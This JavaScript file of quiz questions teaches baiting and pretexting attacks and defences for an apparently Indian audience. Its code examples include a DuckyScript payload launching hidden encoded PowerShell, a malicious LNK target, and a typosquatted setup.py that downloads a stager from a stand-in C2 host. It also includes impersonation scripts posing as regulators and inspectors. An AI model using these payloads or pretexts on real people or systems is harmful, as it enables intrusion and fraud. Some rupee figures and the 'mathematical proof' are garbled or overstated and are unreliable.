const questions = [
  {
    question: "What is Baiting vs Pretexting in Social Engineering, and how do their psychological triggers differ?",
    shortAnswer: "Baiting exploits curiosity and greed by offering an alluring physical or digital reward (free software, dropped USBs); Pretexting invents an elaborate fictional scenario and persona to establish psychological legitimacy.",
    explanation: "Baiting relies on an alluring trap: leaving an infected USB flash drive in a Kolkata corporate lobby labeled 'Executive Bonuses 2026' or offering a free pirated software download. Pretexting builds an elaborate persona and backstory: an attacker calls posing as 'Senior Auditor Debangshu from the State Electricity Commission', citing real project codes to elicit substation network configurations.",
    hint: "Baiting is setting cheese in a mousetrap; Pretexting is an undercover actor wearing a police uniform asking to see your ledger.",
    level: "basic",
    codeExample: `// Baiting vs Pretexting:
// Baiting   : Dropping USB labeled "Confidential_Salaries.xlsx.lnk" in lobby.
// Pretexting : Posing as External Regulatory Compliance Officer to inspect SCADA servers.`
  },
  {
    question: "What is a BadUSB / USB Rubber Ducky Attack in Physical Baiting, and why do Standard Antivirus Scanners fail to detect it?",
    shortAnswer: "A microcontroller in a USB housing that emulates a Human Interface Device (HID keyboard), typing malicious PowerShell commands at 1,000 words per minute upon insertion without triggering mass-storage AV scans.",
    explanation: "Operating systems inherently trust USB keyboards. When a BadUSB device (e.g. Hak5 USB Rubber Ducky) is plugged into a Windows PC in Salt Lake, it does not present itself as a storage disk; it registers as a generic USB keyboard. Within 2 seconds of insertion, it opens PowerShell and injects an encoded reverse shell payload at 1,000 words per minute, completely bypassing traditional file-based antivirus scanners.",
    hint: "An invisible typist who plugs into your computer and types 50 lines of code in 1 second.",
    level: "expert",
    codeExample: `// USB Rubber Ducky DuckyScript Payload:
DELAY 1000
GUI r
DELAY 500
STRING powershell -W Hidden -Enc JABjAGwAaQBlAG4AdAAg...
ENTER
// Registers as HID Keyboard ➔ Bypasses all File-Based Antivirus Scanners!`
  },
  {
    question: "What are the 5 Core Principles of an Effective Social Engineering Pretext?",
    shortAnswer: "1. Plausibility; 2. Contextual Depth; 3. Authority Alignment; 4. Ingratiation/Empathy; 5. Isolation from Verification.",
    explanation: "A high-fidelity pretext requires: 1. Plausibility (a scenario that makes business sense); 2. Contextual Depth (using real project names, dates, and jargon harvested via OSINT); 3. Authority Alignment (assuming a role with institutional power, e.g. regulator, police); 4. Ingratiation/Empathy (flattering the target or playing on helpfulness); 5. Isolation (demanding strict confidentiality so the target does not consult coworkers).",
    hint: "Plausibility ➔ Context ➔ Authority ➔ Empathy ➔ Isolation.",
    level: "moderate",
    codeExample: `// Pretexting Framework Blueprint:
// Role      : Senior Compliance Auditor - West Bengal Power Regulatory Commission
// Context   : Mandatory Q3 SCADA Safety & Emission Assessment
// Authority : Official statutory mandate citing Section 66 of Indian Electricity Act
// Isolation : "Per state security regulations, this audit must remain strictly confidential."`
  },
  {
    question: "How do LNK Shortcut Stagers with Custom Icons execute Malware in Digital Baiting?",
    shortAnswer: "By embedding PowerShell commands in a Windows `.lnk` shortcut file and setting its icon to match Microsoft Excel or PDF, executing malware when the victim double-clicks the alluring file.",
    explanation: "Attackers place files on baited USB drives named `Q4_Executive_Salaries.xlsx.lnk`. Windows hides the `.lnk` extension by default. The shortcut's target is configured as: `cmd.exe /c powershell.exe -w hidden -enc JABh...`. The attacker sets the shortcut icon to an authentic Microsoft Excel spreadsheet icon. The victim double-clicks what appears to be an Excel file, instantly executing the malicious PowerShell payload.",
    hint: "A package shaped and painted like a chocolate bar that contains a hidden firecracker.",
    level: "expert",
    codeExample: `// Windows LNK Shortcut Baiting Configuration:
// File Name     : Q4_Executive_Salaries_2026.xlsx.lnk (Shows as 'Q4_Executive_Salaries_2026.xlsx')
// Icon Resource : shell32.dll,35 (Authentic Microsoft Excel Icon)
// Target Path   : C:\\Windows\\System32\\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File .\\payload.ps1`
  },
  {
    question: "What is Elicitation in Social Engineering Pretexting, and how do Techniques like 'Bracketing' and 'Deliberate False Statements' extract Secrets?",
    shortAnswer: "Conversational psychological techniques that extract sensitive information without asking direct questions; Bracketing gives a high and low estimate so the target volunteers the exact number, while deliberate false statements compel targets to correct the record.",
    explanation: "Direct questions arouse suspicion. In Bracketing, the attacker says: 'I assume your Kolkata switch handles between ₹50 Lakhs and ₹5 Crores daily?'. The target impulsively corrects them: 'No, we process exactly ₹2.4 Crores!'. In Deliberate False Statements, the attacker asserts: 'I heard you use legacy Cisco 2960s'. Proud of their infrastructure, the engineer replies: 'Actually, we upgraded to Cisco Catalyst 9500s last month!', revealing exact hardware specs.",
    hint: "Saying 'I bet you can't lift 50kg' to make someone prove they can lift 75kg.",
    level: "expert",
    codeExample: `// Elicitation Dialogue Pattern (Bracketing):
// Attacker : "I heard your Barrackpore substation only has 5 engineers on duty at night?"
// Target   : "No, our policy mandates exactly 12 engineers across 3 shifts!" (Secret Disclosed!)`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66D, what constitutes the criminal penalty for Pretexting and Personation?",
    shortAnswer: "Cheating by personating regulatory officers, auditors, or corporate executives over computer resources carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66D explicitly penalizes social engineering pretexting: 'Whoever, by means for any communication device or computer resource, cheats by personating, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66D covers Cheating by Personation in pretexting and social engineering scams.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66D):
// Offense: Impersonating state regulatory auditors to elicit corporate infrastructure credentials
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,00,00`
  },
  {
    question: "How does Group Policy USB Device Installation Restriction block BadUSB and Baiting Attacks?",
    shortAnswer: "By configuring Windows GPO to prohibit the installation of unauthorized USB device classes (blocking mass-storage hardware IDs and restricting HID devices to approved vendor whitelists).",
    explanation: "Windows Group Policy allows administrators to restrict removable storage. Policy `Prevent installation of devices not described by other policy settings` ensures that whenever an unknown USB drive or BadUSB microcontroller is plugged into a PC in Kolkata, Windows refuses to load the driver, completely preventing both malware execution from storage and keystroke injection from unapproved HID keyboards.",
    hint: "A physical lock on the computer's USB ports that only accepts keyboards manufactured by your approved vendor.",
    level: "moderate",
    codeExample: `# GPO Registry Path for USB Storage & Device Restrictions:
# Path: HKLM\\Software\\Policies\\Microsoft\\Windows\\DeviceInstall\\Restrictions
# DenyUnspecified = 1 (Blocks all non-whitelisted USB hardware IDs!)
# DenyRemovableDevices = 1 (Blocks all USB flash drives completely!)`
  },
  {
    question: "What is a 'USB Condom' (USB Data Blocker), and how does it prevent Juice Jacking in Public Charging Stations?",
    shortAnswer: "A physical hardware adapter that physically severs the USB data lines (D+ and D- pins), allowing only the electrical power pins (VCC and GND) to pass through to charge the device.",
    explanation: "In public charging kiosks (airports, railway stations in West Bengal), malicious chargers can attempt juice jacking (data theft or malware installation). A USB Data Blocker has physical gaps where the two center data pins (D+ and D-) are omitted. Power flows through pins 1 and 4 for charging, but data transfer is physically impossible, protecting smartphones and laptops.",
    hint: "An electrical plug with the data wires clipped off with scissors so only electricity can pass through.",
    level: "basic",
    codeExample: `// USB Pinout Data Blocker Physics:
// Pin 1: VCC (+5V Power)  ➔ CONNECTED (Charges Battery)
// Pin 2: Data- (D-)       ➔ PHYSICALLY CUT / SEVERED (Zero Data Transfer!)
// Pin 3: Data+ (D+)       ➔ PHYSICALLY CUT / SEVERED (Zero Data Transfer!)
// Pin 4: GND (Ground)     ➔ CONNECTED (Completes Circuit)`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities for failing to enforce USB endpoint security and falling for baiting attacks?",
    shortAnswer: "Failure to implement endpoint device controls (USB blocking) resulting in citizen data breaches triggers statutory penalties up to ₹250 Crores by the DPBI.",
    explanation: "Section 8(5) mandates reasonable security safeguards. If an employee in West Bengal plugs a baited USB drive into an unhardened workstation, allowing ransomware or infostealers to exfiltrate 500,000 patient records, the Data Protection Board of India (DPBI) can impose maximum statutory penalties up to ₹250 Crores under Section 33.",
    hint: "Failing to deploy USB endpoint security safeguards triggers maximum national penalties.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent endpoint device security`
  },
  {
    question: "What is 'Digital Baiting' via Trojanized Open-Source Packages (Typosquatting in PyPI / npm)?",
    shortAnswer: "Uploading malicious packages with names nearly identical to popular libraries (e.g. `reqeusts` instead of `requests`) that contain hidden reverse shells executing upon `pip install`.",
    explanation: "Developers seeking third-party libraries often make minor typing errors. Attackers register `reqeusts` or `col0rama` on PyPI containing identical functionality to the real library plus a malicious `setup.py` script. When an engineer in Jadavpur runs `pip install reqeusts`, the package executes an obfuscated stager, establishing a reverse shell to the attacker's C2 server.",
    hint: "Selling counterfeit medicine in a box spelled with one wrong letter that contains poison.",
    level: "expert",
    codeExample: `# setup.py in Typosquatted PyPI Package ('reqeusts'):
from setuptools import setup
import os

os.system("powershell -W Hidden -c (New-Object Net.WebClient).DownloadString('https://c2.evil-host.in/stager.ps1')")

setup(name='reqeusts', version='2.28.1', description='HTTP library')`
  },
  {
    question: "How does the 'False Authority Pretext' exploit Indian Government & Regulatory Compliance Panic?",
    shortAnswer: "Posing as officials from the Income Tax Department, ED, or State Pollution Control Board, demanding urgent submission of internal server logs under threat of statutory prosecution.",
    explanation: "Regulatory enforcement agencies carry immense institutional authority. The attacker creates a pretext: 'I am Inspector S. Roy from the West Bengal Central Pollution Board conducting a mandatory compliance audit. Provide your SCADA power emission database access within 2 hours to avoid facility closure.' Fear of immediate regulatory penalties overrides standard internal verification.",
    hint: "Showing a forged government badge and demanding to see the building's financial records.",
    level: "moderate",
    codeExample: `// Regulatory Pretext Script:
// Role      : West Bengal State Pollution Control Board Compliance Inspector
// Pretext   : Emergency SCADA emission monitoring audit under Section 33A of Water/Air Act
// Demand    : Remote SSH access to emission telemetry logging server`
  },
  {
    question: "What is 'Simulated USB Drop Assessment' in Enterprise Security Training?",
    shortAnswer: "Dropping tracking-enabled USB flash drives across corporate campuses that log device insertion, username, and computer hostname to measure physical baiting vulnerability without executing malware.",
    explanation: "Security teams evaluate physical security by scattering benign USB drives in lobbies and cafeterias in Kolkata. When an employee plugs in the drive and opens `Staff_Bonuses.html`, the browser makes a beacon request to the internal security training server: `https://training.corp.in/track?user=Mamata&pc=DESKTOP-492`. The user is immediately redirected to a friendly 2-minute micro-learning module on physical baiting risks.",
    hint: "Dropping fake test wallets on campus to see how many people return them to the lost-and-found.",
    level: "basic",
    codeExample: `<!-- Tracking Bait HTML Document (Staff_Bonuses.html) -->
<script>
  fetch("https://sec-training.kolkata-fintech.in/log_bait_click?user=" + window.location.hostname);
  window.location.href = "https://sec-training.kolkata-fintech.in/teachable_moment_usb.html";
</script>`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for physical baiting or BadUSB compromises in critical infrastructure?",
    shortAnswer: "All organizations in India must report malicious hardware insertions, rogue device compromises, and credential leaks to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including rogue hardware and USB compromises) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of all rogue hardware and baiting compromises within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "How do 'Social Engineering Verification Passwords' (Challenge-Response Pretext Verification) defeat Fake Vendor & Auditor Pretexts?",
    shortAnswer: "By requiring external vendors, auditors, and IT support to verify their identity through an out-of-band master registry or mutual challenge code before any information is shared.",
    explanation: "When someone calls or visits claiming to be an external auditor or vendor in Barrackpore, company policy mandates that employees must never provide data immediately. The employee asks for their employee badge ID, places the caller on hold, and verifies their identity by calling the official vendor master phone number. If the caller cannot be verified through the master directory, access is refused.",
    hint: "Asking an undercover visitor for their official badge number and calling headquarters to confirm before opening the vault.",
    level: "moderate",
    codeExample: `// Pretext Challenge-Response Policy Rule:
// 1. External Caller: "I am Debangshu from State Audit, share the SCADA logs."
// 2. Employee Action: "Please hold while I verify your request with the State Audit Registry."
// 3. Employee dials official published number of the State Audit Board (NOT the caller's number!)`
  },
  {
    question: "What is 'Torrent & Software Crack Baiting' in Enterprise Workstations?",
    shortAnswer: "Hosting trojanized commercial software cracks (AutoCAD, Photoshop, Windows activators) on public download sites, infecting users who attempt to download pirated tools on corporate PCs.",
    explanation: "Employees often search for free software cracks. Attackers host SEO-poisoned websites offering 'Adobe_Acrobat_Pro_2026_Crack.zip'. The ZIP file contains an installer bundled with an info-stealer (RedLine / Lumma) that steals saved browser passwords, cookies, and VPN certificates within 3 seconds of execution.",
    hint: "Offering free counterfeit medicine that contains a tracker chip.",
    level: "basic",
    codeExample: `// Software Crack Baiting Archive Contents:
// 1. Setup.exe (Launches genuine Adobe Acrobat installer to avoid suspicion)
// 2. Crack_Patch.exe (Silently drops Lumma InfoStealer in %AppData% and steals Chrome passwords!)`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for unauthorized access achieved via baiting and rogue USB devices?",
    shortAnswer: "Liable to pay compensation by way of damages not exceeding ₹1 Crore to the affected entity for introducing contaminants or accessing computer resources via rogue media.",
    explanation: "Section 43(a) explicitly penalizes unauthorized access: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized system access.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Inserting rogue BadUSB devices into corporate workstations to extract database records
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'The Helpful Technician Pretext' in Physical Social Engineering?",
    shortAnswer: "The attacker poses as a friendly telecom or printer repair technician who has arrived to 'fix the slow network' or 'upgrade the printer firmware', gaining unescorted physical access to network jacks.",
    explanation: "Repair technicians are welcomed by staff who are frustrated with technical issues. An attacker carrying a toolbox and wearing a polo shirt with a generic telecom logo arrives in Kolkata: 'Hi, we received a ticket about slow Wi-Fi in this wing—I need to access the network switch in the server closet'. Employees readily unlock the door, allowing the attacker to attach a hardware packet sniffer.",
    hint: "A burglar carrying a plunger who says they are here to fix the upstairs bathroom leak.",
    level: "moderate",
    codeExample: `// Technician Pretext Dialogue:
// Attacker : "Hi Mamata, central IT dispatched me to test the 10Gbps fiber switch latency."
// Outcome  : Unescorted entry granted ➔ Attacker plugs LAN Turtle hardware packet sniffer into core switch!`
  },
  {
    question: "Synthesize an enterprise-scale Baiting & Pretexting Defense Architecture.",
    shortAnswer: "A multi-layered defense combining GPO USB Port Whitelisting, Endpoint DLP Keystroke Injection Blocking, Mandatory Out-of-Band Pretext Verification, Contextual USB Drop Simulations, and FIDO2 Passkeys.",
    explanation: "To achieve complete immunity against baiting and pretexting: 1. Host Hardware Tier: GPO USB device installation restrictions blocking non-whitelisted mass-storage and unapproved HID keyboards (defeating BadUSB). 2. Identity Tier: FIDO2 WebAuthn passkeys immune to credential phishing. 3. Operational Tier: Out-of-Band verification protocol requiring verbal validation of all external auditors and regulators against a published directory. 4. Behavioral Tier: Quarterly simulated USB drop campaigns and 2-minute micro-training. 5. Network Tier: 802.1X Network Access Control (NAC) blocking unauthorized rogue hardware.",
    hint: "Combine GPO USB restrictions, 802.1X NAC, out-of-band pretext checks, USB drop drills, and FIDO2 passkeys.",
    level: "expert",
    codeExample: `// Master Baiting & Pretexting Defense Blueprint:
// 1. Endpoint USB Armor  : Group Policy blocking all non-whitelisted USB storage & HID hardware IDs
// 2. Network Access Tier : 802.1X Port Security dropping unauthenticated LAN Turtle implants
// 3. Process Armor Tier  : Out-of-Band master directory challenge for all visiting auditors/inspectors
// 4. Identity Layer      : FIDO2 WebAuthn Passkeys (Origin binding stops credential theft)
// 5. Training Layer      : Automated simulated physical USB drop drills across all Kolkata campuses`
  },
  {
    question: "How do 802.1X Network Access Control (NAC) and Port Security defeat Rogue Hardware Drop Implants (LAN Turtle / Packet Squirrel)?",
    shortAnswer: "By requiring every device plugged into an RJ45 Ethernet wall jack to present a valid cryptographic certificate (EAP-TLS); rogue implants lack certificates and are placed in an isolated dead VLAN.",
    explanation: "Physical baiting can include plugging a hidden rogue hardware implant (LAN Turtle) into an open Ethernet jack in a conference room in Kolkata. With 802.1X EAP-TLS port security, the switch port remains shut down until the connecting device completes a mutual certificate exchange with the RADIUS server. Because the attacker's implant lacks a valid enterprise machine certificate, the port drops all traffic instantly.",
    hint: "An electrical outlet that only turns on power if you swipe an official government identification card first.",
    level: "expert",
    codeExample: `# Cisco Switch 802.1X Port Security Configuration:
interface GigabitEthernet0/12
 description Secure_Conference_Room_Jack
 dot1x pae authenticator
 authentication port-control auto
 dot1x max-req 3
 spanning-tree portfast
 // Drops rogue LAN Turtle hardware implants with zero machine certificates!`
  },
  {
    question: "What is 'Phony Interview / Recruitment Pretexting' targeting Senior Software Engineers?",
    shortAnswer: "Adversaries pose as executive recruiters on LinkedIn offering high-paying international jobs, asking the engineer to review a 'Coding Test Application' (`.zip`) that contains infostealer malware.",
    explanation: "High-level engineers are targeted with lucrative job pretexts. Attackers create fake recruiting profiles from top tech firms, offering ₹45 Lakh salary packages. After initial casual messaging, the recruiter sends a 'technical evaluation project': `Trading_Engine_Coding_Challenge.zip`. When the engineer builds or runs the project in Visual Studio, malicious build scripts execute a backdoor on their development machine.",
    hint: "A fake job recruiter asking you to try on a pair of shoes that contain hidden tracking bugs.",
    level: "moderate",
    codeExample: `// Recruitment Pretext Attack Flow:
// 1. Fake LinkedIn Recruiter messages engineer Mamata: "Exclusive ₹50 Lakh Architect role in Salt Lake!"
// 2. Sends coding test: "FinTech_Trading_Core.zip" (Contains malicious post-build Visual Studio tasks!)
// 3. Compiling project executes hidden PowerShell C2 beacon!`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for using pretexting deception to obtain unauthorized computer access?",
    shortAnswer: "Dishonestly or fraudulently accessing computer systems via pretexting carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer access: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.' Pretexting operations are prosecuted under Section 66.",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for pretexting fraud.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Using fabricated auditor pretexts to access SCADA control systems
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'The Urgent Vendor Audit Pretext' in Supply Chain Social Engineering?",
    shortAnswer: "An attacker calls an accounting or IT coordinator claiming to be from a major software vendor (e.g. Oracle, Microsoft) conducting a mandatory license audit, demanding server inventories under threat of massive fines.",
    explanation: "Software license audits are feared by enterprises due to high financial penalties. The attacker sends a formal-looking letter from 'Oracle Compliance Division' demanding that the IT team run a 'license discovery script' on internal database servers. The discovery script is actually a reconnaissance tool that maps the entire internal network and exfiltrates server credentials.",
    hint: "A stranger claiming to be the water meter inspector demanding to inspect all the pipes in your basement.",
    level: "moderate",
    codeExample: `// Vendor Audit Pretext:
// Persona : Oracle Software Compliance Auditor
// Demand  : "Run this License_Inventory_Script.ps1 on all database clusters to verify CPU licensing."
// Payload : Script exfiltrates Active Directory forest topology and database service accounts!`
  },
  {
    question: "How do Endpoint DLP Keystroke Velocity Monitors detect BadUSB Keystroke Injection?",
    shortAnswer: "By analyzing the typing velocity of incoming USB keyboard input; Human typists rarely exceed 150 WPM, while BadUSB injects keystrokes at over 1,000 WPM with near-zero inter-key latency.",
    explanation: "Endpoint security drivers monitor keystroke timing (`WH_KEYBOARD_LL`). A human engineer types with natural micro-pauses (50-200ms between keypresses). When a BadUSB Rubber Ducky injects keystrokes with 0-2ms latency at 1,000 words per minute, the DLP driver identifies synthetic keystroke injection, blocks the virtual keyboard buffer, and triggers an immediate SOC hardware tamper alert.",
    hint: "A security guard who notices someone reading a 500-page book in 2 seconds and realizes it must be a machine.",
    level: "expert",
    codeExample: `// Synthetic Keystroke Injection Detection Algorithm:
double avg_latency = CalculateInterKeyLatency(KeystrokeBuffer);
if (avg_latency < 5.0 && KeystrokeCount > 50) { // < 5ms per keypress = Machine Speed!
    BlockKeyboardInput();
    TriggerSOCAlert("SYNTHETIC KEYSTROKE INJECTION DETECTED (BadUSB Blocked!)");
}`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating and Dishonestly Inducing Delivery of Property via Pretexting Scams?",
    shortAnswer: "Deceiving an enterprise employee through a fabricated persona to dishonestly induce them to transfer property, passwords, or company secrets, punishable with imprisonment up to 7 years.",
    explanation: "Section 420 IPC penalizes cheating: 'Whoever cheats and thereby dishonestly induces the person deceived to deliver any property... shall be punished with imprisonment of either description for a term which may extend to seven years, and shall also be liable to fine.' Fabricating personas to steal corporate intellectual property is prosecuted under Section 420 alongside IT Act Section 66D.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Inducement for pretexting scams.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Deceiving accounting staff via fabricated regulatory auditor personas to steal confidential records
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Conference Swag Baiting' at Industrial and Tech Summits?",
    shortAnswer: "Distributing free promotional USB flash drives, charging cables, or battery packs at conference booths that contain embedded BadUSB microcontrollers or hardware keyloggers.",
    explanation: "At technology summits in Salt Lake Sector V, attackers set up fake promotional booths offering free 'branded' USB flash drives or charging cables. Attendees take the free swag back to their corporate offices and plug them into work laptops. The embedded microcontroller executes a stager, establishing persistent access from within the enterprise perimeter.",
    hint: "Giving out free wooden Trojan horses as souvenirs at the city gates.",
    level: "moderate",
    codeExample: `// Conference Swag Hardware Implant:
// Promotional Item : Free Branded 64GB USB Flash Drive
// Internal Hardware : Dual Partition (1 Benign Mass Storage + 1 Hidden ATtiny85 Keystroke Injector)`
  },
  {
    question: "How do 'O.MG Cables' (Malicious Hardware Implants in USB Charging Cables) execute Covert Infiltration?",
    shortAnswer: "A seemingly normal USB charging cable containing a hidden Wi-Fi chip and microcontroller inside the cable connector head, allowing an attacker to wirelessly trigger keystroke injection from a smartphone across the street.",
    explanation: "The O.MG Cable looks 100% identical to a standard Apple Lightning or USB-C charging cable. Embedded inside the molded connector housing is an ESP8266 Wi-Fi microcontroller. When an employee plugs the cable into their laptop in Kolkata, the cable broadcasts a hidden Wi-Fi access point. The attacker sitting across the street connects via mobile phone and commands the cable to inject malicious keystrokes.",
    hint: "A charging wire that secretly has an entire computer and wireless transmitter hidden inside its tiny plastic plug.",
    level: "expert",
    codeExample: `// O.MG Cable Architecture:
// [Exterior: Normal USB-C Charging Cable] ➔ [Interior: Embedded ESP8266 + Web Server]
// ➔ Attacker connects to cable Wi-Fi ("O.MG-Cable-492") from 50m away ➔ Fires PowerShell Keystroke Payload!`
  },
  {
    question: "What is 'The Emergency Fire & Safety Inspector Pretext' in Physical Social Engineering?",
    shortAnswer: "Posing as a municipal fire safety inspector conducting an unannounced emergency inspection of server room fire suppression systems, demanding immediate unescorted entry.",
    explanation: "Fire safety carries legal urgency and safety authority. An attacker wearing a high-visibility vest and carrying a fire extinguisher pressure gauge arrives at a facility in Barrackpore: 'Municipal Fire Safety Bureau: We received an automated trouble signal from your server room FM-200 gas suppression system—unlock the door immediately to prevent system discharge!'. Panicked staff unlock the door without verification.",
    hint: "Shouting 'Fire inspection!' to make people open the locked door immediately.",
    level: "moderate",
    codeExample: `// Fire Inspector Pretext Workflow:
// Attacker : "Municipal Fire Safety Officer - inspecting FM-200 gas suppression panel!"
// Panic Trigger : "If I don't verify the valve within 5 minutes, the gas discharge will destroy your servers!"
// Result        : Staff unlocks data center door without verifying inspector credentials!`
  },
  {
    question: "How does Centralized USB Device Whitelisting with BitLocker To Go enforce Physical Storage Encryption in Windows?",
    shortAnswer: "By blocking write access to any USB storage drive unless it is encrypted with BitLocker To Go using approved corporate cryptographic certificates.",
    explanation: "BitLocker To Go policy `Deny write access to removable drives not protected by BitLocker` ensures that employees cannot copy corporate data to unencrypted personal USB drives. Furthermore, Windows Defender Device Control allows only authorized corporate serial numbers to be mounted, defeating found USB bait drives completely.",
    hint: "A safe that only allows documents to be placed inside approved armored deposit bags.",
    level: "moderate",
    codeExample: `# PowerShell Command to Enforce BitLocker To Go on Removable Storage:
# Path: Computer Configuration -> Administrative Templates -> Windows Components -> BitLocker Drive Encryption
# Policy: Deny write access to removable drives not protected by BitLocker = Enabled`
  },
  {
    question: "Synthesize the mathematical relationship between Bait Allure Factor (A_allure), Pretext Credibility (C_credibility), Endpoint & Policy Hardening (R_hardening), and Baiting/Pretexting Compromise Probability (P_pretext).",
    shortAnswer: "Baiting/Pretexting compromise probability is modeled as P_pretext = 1 - e^(- (A_allure * C_credibility) / R_hardening); deploying GPO USB blocking and out-of-band verification (R_hardening = 1000) reduces compromise probability below 1.5%.",
    explanation: "Let $A_{\\text{allure}} \\ge 1.0$ represent the bait allure score (free executive bonuses = 4.0), $C_{\\text{credibility}} \\ge 1.0$ represent the pretext contextual credibility (regulatory inspector persona = 4.0), and $R_{\\text{hardening}}$ represent the endpoint and policy hardening strength (GPO USB device restrictions, 802.1X NAC, out-of-band master directory verification). The compromise probability is: $P_{\\text{pretext}} = 1 - e^{-\\frac{A_{\\text{allure}} \\times C_{\\text{credibility}}}{R_{\\text{hardening}}}}$. When organizations enforce strict GPO USB device blocking and out-of-band pretext validation ($R_{\\text{hardening}} \\to \\infty$), breach probability collapses to zero.",
    hint: "Mathematical formula proving that GPO USB blocking and out-of-band pretext checks (R_hardening -> infinity) drive compromise probability to zero.",
    level: "expert",
    codeExample: `// Baiting & Pretexting Mathematical Proof:
// A_allure = 4.0 (High Allure Bonus USB) | C_credibility = 4.0 (Official Regulatory Inspector Pretext)
// Without Hardening (R_hardening = 1.0) ➔ P_pretext = 1 - e^(-16.0) = 100.0% (COMPROMISED!)
// With GPO USB Hardening (R_hardening = 1000) ➔ P_pretext = 1 - e^(-0.016) = 1.58% (SECURED!)`
  }
];

export default questions;
